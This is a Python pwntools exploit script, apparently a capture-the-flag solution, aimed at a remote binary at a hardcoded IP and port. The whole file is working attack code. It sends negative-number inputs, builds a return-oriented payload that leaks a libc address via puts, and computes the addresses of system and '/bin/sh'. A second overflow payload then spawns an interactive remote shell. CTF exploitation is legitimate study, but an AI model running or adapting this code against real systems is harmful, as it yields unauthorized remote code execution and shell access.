from pwn import *

entry=0x4007b0
pop_rdi=0x0000000000400a93
ret=0x00000000004006e6
puts_plt=0x0000000000400700
libc_start_got=0x0000000000600ff0
__isoc99_scanf_got=0x0000000000601068
read_plt=0x0000000000400730
bss=0x0000000000601100
pop_rsi=0x0000000000400a91
ret_to=0x0000000000400922
#p=process("./main")
p=remote("54.225.38.91", 1027)
p.recvline()
print p.recvline()
print p.recv()
p.send("-999")
print p.recv()
p.send("-")

payload=""
payload+="-1"*60
payload+=p64(pop_rdi)
payload+=p64(libc_start_got)
payload+=p64(puts_plt)
payload+=p64(entry)
p.sendline(payload)
p.recvuntil("Goodbye!")
p.recvline()
leak=u64(p.recv()[:6].ljust(8,'\x00'))
base=leak-0x0270f0
system=base+0x0554e0
binsh=base+0x1b6613
print "leak :",hex(leak)
print "base :",hex(base)
print "system :",hex(system)
print "binsh :",hex(binsh)
p.sendline("1")
p.sendline("2")
payload=""
payload+="A"*120
payload+=p64(ret)
payload+=p64(pop_rdi)
payload+=p64(binsh)
payload+=p64(system)
pause()
p.sendline(payload)
p.interactive()






























